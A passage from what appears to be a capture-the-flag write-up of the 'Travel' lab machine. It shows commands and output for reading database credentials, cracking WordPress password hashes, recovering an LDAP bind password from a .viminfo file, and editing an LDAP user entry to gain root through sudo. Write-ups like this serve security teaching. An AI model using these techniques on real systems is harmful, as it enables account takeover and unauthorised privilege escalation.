href="#Pivot-www-data-gt-lynik-admin" class="headerlink" title="Pivot www-data -&gt; lynik-admin"></a>Pivot www-data -&gt; lynik-admin</h3><p>The <code>hostname</code> and different informations makes us understand we are in a Docker container:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/$ ls -la /</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Apr 23 18:44 .dockerenv</span><br><span class="line">www-data@blog:/home$ cat /proc/1/cgroup</span><br><span class="line">12:devices:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">11:memory:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">10:freezer:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">9:perf_event:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">7:net_cls,net_prio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">6:hugetlb:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">5:blkio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">4:cpu,cpuacct:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">3:pids:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">2:cpuset:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">1:name=systemd:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br></pre></td></tr></table></figure><p>Well let’s keep that in mind and continue our recon.</p><p>Since we know the travel website is a Wordpress site we can retrieve database credentials inside <code>wp-config.php</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;fiFtDDV9LYe8Ti&#x27;</span> );</span><br></pre></td></tr></table></figure><p>Let’s see if we can retrieve interesting accounts from the database:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ mysql -u wp -p</span><br><span class="line">mysql -u wp -p</span><br><span class="line">Enter password: fiFtDDV9LYe8Ti</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wp                 |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; USE wp</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SHOW TABLES;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wp          |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SELECT * FROM wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | $P<span class="variable">$BIRXVj</span>/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure><p>We have a hash from <code>admin</code> account. Unfortunately <code>John</code> can not seem to crack it. Let’s move on.</p><p>While looking around we quickly stumble upon a database backup file in <code>/opt/wordpress/</code> containing another user account belonging to <code>lynik-admin</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/opt/wordpress$ grep -ri <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">grep <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">[...]</span><br><span class="line">CREATE TABLE `wp_users` (</span><br><span class="line">-- Dumping data <span class="keyword">for</span> table `wp_users`</span><br><span class="line">LOCK TABLES `wp_users` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin@travel.htb&#x27;</span>,<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;2020-04-13 13:19:01&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;admin&#x27;</span>),(2,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#x27;</span>,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;lynik@travel.htb&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;2020-04-13 13:36:18&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;Lynik Schmidt&#x27;</span>);</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br><span class="line">www-data@blog:/opt/wordpress$</span><br></pre></td></tr></table></figure><p>Let’s see if we can crack its password hash:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt lynik-hash           </span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">1stepcloser      (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo! Let’s see if we can connect through SSH using this credential:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ ssh lynik-admin@travel.htb</span><br><span class="line">lynik-admin@travel.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri 29 May 2020 01:39:02 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:                      0.1</span></span><br><span class="line"><span class="string">  Usage of /:                       46.1% of 15.68GB</span></span><br><span class="line"><span class="string">  Memory usage:                     18%</span></span><br><span class="line"><span class="string">  Swap usage:                       0%</span></span><br><span class="line"><span class="string">  Processes:                        200</span></span><br><span class="line"><span class="string">  Users logged in:                  0</span></span><br><span class="line"><span class="string">  IPv4 address for br-836575a2ebbb: 172.20.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for docker0:         172.17.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0:            10.10.10.189</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lynik-admin@travel:~$ cat user.txt</span></span><br><span class="line"><span class="string">7xxxxxxxxxxxxxxxxxxxxxxxa</span></span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing that come to mind is to check for more informations about docker. We know that docker is running and hosting the Travel Blog:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:c0:9b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.189/24 brd 10.10.10.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: br-836575a2ebbb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:48:28:52:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-8ec6dcae5ba1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:6d:76:46:c1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:28:4b:e0:70 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>Unfortunately <code>lynik-admin</code> does not belong to <code>docker</code> group so we can not escalate privileges this way (it would have been too easy right?).</p><h3 id="LDAP-Server"><a href="#LDAP-Server" class="headerlink" title="LDAP Server"></a>LDAP Server</h3><p>While looking around we notice a few informations about a LDAP server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 travel</span><br><span class="line">172.20.0.10 ldap.travel.htb</span><br><span class="line">lynik-admin@travel:~$ cat .ldaprc</span><br><span class="line">HOST ldap.travel.htb</span><br><span class="line">BASE dc=travel,dc=htb</span><br><span class="line">BINDDN cn=lynik-admin,dc=travel,dc=htb</span><br></pre></td></tr></table></figure><p>Let’s digg a bit more to see what additional informations we can find about this LDAP server.</p><h3 id="LDAP-Admin-Password"><a href="#LDAP-Admin-Password" class="headerlink" title="LDAP Admin Password"></a>LDAP Admin Password</h3><p>While searching for file related to ldap we strangely find a few occurence of the <code>ldap</code> string in <code>.viminfo</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ grep -ri ldap</span><br><span class="line">.viminfo:<span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:-&#x27;</span>  3  0  ~/.ldaprc</span><br><span class="line">.viminfo:|4,39,3,0,1587670530,<span class="string">&quot;~/.ldaprc&quot;</span></span><br><span class="line">.viminfo:-<span class="string">&#x27;  1  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">.viminfo:|4,39,1,0,1587670527,&quot;~/.ldaprc&quot;</span></span><br><span class="line"><span class="string">.viminfo:&gt; ~/.ldaprc</span></span><br><span class="line"><span class="string">.ldaprc:HOST ldap.travel.htb</span></span><br></pre></td></tr></table></figure><p>According to <a href="https://vimhelp.org/starting.txt.html#viminfo">vim man page</a>, <code>.viminfo</code> is used as “session” file:</p><blockquote><p>If you exit Vim and later start it again, you would normally lose a lot of<br>information.  The viminfo file can be used to remember that information, which<br>enables you to continue where you left off.</p><p>The viminfo file is used to store:</p><ul><li>The command line history.</li><li>The search string history.</li><li>The input-line history.</li><li>Contents of non-empty registers.</li><li>Marks for several files.</li><li>File marks, pointing to locations in files.</li><li>Last search/substitute pattern (for ‘n’ and ‘&amp;’).</li><li>The buffer list.</li><li>Global variables.</li></ul></blockquote><p>Let’s see what informations we can find in this file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ cat .viminfo</span><br><span class="line"><span class="comment"># This viminfo file was generated by Vim 8.1.</span></span><br><span class="line"><span class="comment"># You may edit it if you&#x27;re careful!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Command Line History (newest to oldest):</span></span><br><span class="line">:wq!</span><br><span class="line">|2,0,1587670530,,<span class="string">&quot;wq!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registers:</span></span><br><span class="line"><span class="string">&quot;&quot;</span>1     LINE    0</span><br><span class="line">        BINDPW Theroadlesstraveled</span><br><span class="line">|3,1,1,1,1,0,1587670528,<span class="string">&quot;BINDPW Theroadlesstraveled&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># File marks:</span></span><br><span class="line"><span class="string">&#x27;0  3  0  ~/.ldaprc</span></span><br><span class="line"><span class="string">|4,48,3,0,1587670530,&quot;~/.ldaprc&quot;</span></span><br></pre></td></tr></table></figure><p>We have an interesting line containing <code>BINDPW Theroadlesstraveled</code>. According to LDAP documentation <code>BINDPW</code> seems to be the administrative password of this LDAP Server.</p><p>Let’s confirm the password is valid:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ man ldapsearch</span><br><span class="line">-x            Use simple authentication instead of SASL.</span><br><span class="line">-w passwd     Use passwd as the password <span class="keyword">for</span> simple authentication.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w hg8</span><br><span class="line">ldap_bind: Invalid credentials (49)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=travel,dc=htb&gt; (default) with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># travel.htb</span></span><br><span class="line">dn: dc=travel,dc=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: Travel.HTB</span><br><span class="line">dc: travel</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin, travel.htb</span></span><br><span class="line">dn: cn=admin,dc=travel,dc=htb</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: admin</span><br><span class="line">description: LDAP administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lynik-admin, travel.htb</span></span><br><span class="line">dn: cn=lynik-admin,dc=travel,dc=htb</span><br><span class="line">description: LDAP administrator</span><br><span class="line">objectClass: simpleSecurityObject</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: lynik-admin</span><br><span class="line">userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=</span><br><span class="line"> =</span><br><span class="line"> </span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># louise, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">uid: louise</span><br><span class="line">cn: Louise Griffin</span><br><span class="line">sn: Griffin</span><br><span class="line">givenName: Louise</span><br><span class="line">loginShell: /bin/bash</span><br><span class="line">uidNumber: 5007</span><br><span class="line">gidNumber: 5000</span><br><span class="line">homeDirectory: /home/louise</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># numResponses: 22</span></span><br><span class="line"><span class="comment"># numEntries: 21</span></span><br></pre></td></tr></table></figure><p>Bingo! We confirmed we have the LDAP admin password. </p><h3 id="LDAP-User-privilege-escalation"><a href="#LDAP-User-privilege-escalation" class="headerlink" title="LDAP User privilege escalation"></a>LDAP User privilege escalation</h3><p>Since we have admin permissions over the LDAP server we should be able to add a new user with <code>root</code> privileges right ? Let’s give it a try.</p><p>First we create our user entry with our own SSH key and password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dn: uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">uid: hg8</span><br><span class="line">userPassword: hg8password</span><br><span class="line">homeDirectory: /root</span><br><span class="line">loginShell: /bin/sh</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">ssh-rsa AAxxx hg8@htb.htb</span><br></pre></td></tr></table></figure><p>Then use <code>ldapadd</code> command to add it to the LDAP directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapadd -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f /tmp/.hg8/hg8.ldif</span><br><span class="line">adding new entry <span class="string">&quot;uid=hg8,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br><span class="line">ldap_add: Insufficient access (50)</span><br><span class="line">        additional info: no write access to parent</span><br></pre></td></tr></table></figure><p>Bummer! We don’t have permission to do so. </p><p>Well given we found that there is already several users on the server, we should probably have enough privilege to edit one instead of creating a new one.</p><p>Here is what we are going to do:</p><ul><li>Adding the ability to Louise account to connect through SSH using our own SSH key.</li><li>Adding Louise to sudoers user in order to escalate our privileges</li><li>Editing Louise password to allows the use of <code>sudo</code> command.</li></ul><p>After getting the <code>gid</code> of <code>sudo</code> group using <code>getintent</code> we have all the needed informations to create our modified LDAP entry for user Louise:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ getent group sudo</span><br><span class="line">sudo:x:27:trvl-admin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ cat hg8.ldif</span><br><span class="line">dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: homeDirectory</span><br><span class="line">homeDirectory: /root</span><br><span class="line">-</span><br><span class="line">add: objectClass</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">-</span><br><span class="line">add: sshPublicKey</span><br><span class="line">sshPublicKey: ssh-rsa AAAxxx hg8@htb.htb</span><br><span class="line">-</span><br><span class="line">replace: userPassword</span><br><span class="line">userPassword: hg8password</span><br><span class="line">-</span><br><span class="line">replace: gidNumber</span><br><span class="line">gidNumber: 27</span><br></pre></td></tr></table></figure><p>Now we apply the modification:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:/$ ldapmodify -D <span class="string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span>  -w Theroadlesstraveled -f hg8.ldif</span><br><span class="line">modifying entry <span class="string">&quot;uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span></span><br></pre></td></tr></table></figure><p>And we should be able to login as <code>louise</code> and use <code>sudo</code> to escalate our privileges to <code>root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ ssh -i id_rsa_htb louise@travel.htb</span><br><span class="line">Creating directory <span class="string">&#x27;/home@TRAVEL/louise&#x27;</span>.</span><br><span class="line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System load:                      0.06</span><br><span class="line">  Usage of /:                       46.2% of 15.68GB</span><br><span class="line">  Memory usage:                     19%</span><br><span class="line">  Swap usage:                       0%</span><br><span class="line">  Processes:                        209</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-836575a2ebbb: 172.20.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-8ec6dcae5ba1: 172.30.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0:            10.10.10.189</span><br><span class="line"></span><br><span class="line">Last login: Fri May 29 14:19:07 2020 from 10.10.14.18</span><br><span class="line"></span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">louise@travel:~$ sudo id</span><br><span class="line">[sudo] password <span class="keyword">for</span> louise:</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span 